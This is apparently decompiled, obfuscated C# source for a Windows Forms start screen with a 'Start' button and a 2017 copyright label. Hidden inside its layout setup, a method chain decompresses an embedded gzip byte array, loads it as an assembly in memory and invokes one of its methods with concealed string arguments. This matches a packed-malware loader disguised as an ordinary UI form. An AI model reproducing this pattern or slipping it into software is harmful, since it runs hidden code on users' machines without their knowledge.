using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Windows.Forms;
using ns10;
using ns13;
using ns5;

namespace ns11;

public class Form1 : Form
{
	private IContainer icontainer_0 = null;

	private static Form1 form1_0;

	private Button button1;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Form val = (Form)(object)new Login();
		((Control)val).Show();
		((Control)this).Hide();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	protected override void vmethod_0(bool bool_0)
	{
		if (bool_0 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(bool_0);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		label1 = new Label();
		method_0();
		((Control)button1).set_BackColor(Color.DodgerBlue);
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(714, 522));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(86, 26));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Start");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(782, 566));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(83, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Copyrights 2017");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Gray);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)4);
		((Form)this).set_ClientSize(new Size(912, 600));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Start");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void method_0()
	{
		smethod_0();
	}

	private static void smethod_0()
	{
		smethod_4();
	}

	internal static void smethod_1(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	public static byte[] smethod_2(byte[] byte_0)
	{
		byte[] result;
		using (GZipStream gZipStream = new GZipStream(new MemoryStream(byte_0), CompressionMode.Decompress))
		{
			byte[] array = new byte[4096];
			using MemoryStream memoryStream = new MemoryStream();
			int num;
			do
			{
				num = gZipStream.Read(array, 0, 4096);
				if (num > 0)
				{
					smethod_1(memoryStream, array, 0, num);
				}
			}
			while (num > 0);
			int num4;
			do
			{
				result = memoryStream.ToArray();
				int num2 = 1;
				if (smethod_3() != null)
				{
					num2 = 0;
				}
				int num3 = num2;
				num4 = num3;
			}
			while (num4 != 1);
		}
		return result;
	}

	internal static Form1 smethod_3()
	{
		return form1_0;
	}

	public static void smethod_4()
	{
		Assembly assembly = Assembly.Load(smethod_2(Class1.TypeLibVarFlags));
		Type type = assembly.GetTypes()[0];
		MethodInfo methodInfo = type.GetMethods()[3];
		methodInfo.Invoke(null, new object[3]
		{
			Class0.string_0,
			Class0.string_1,
			"DB_project"
		});
	}
}
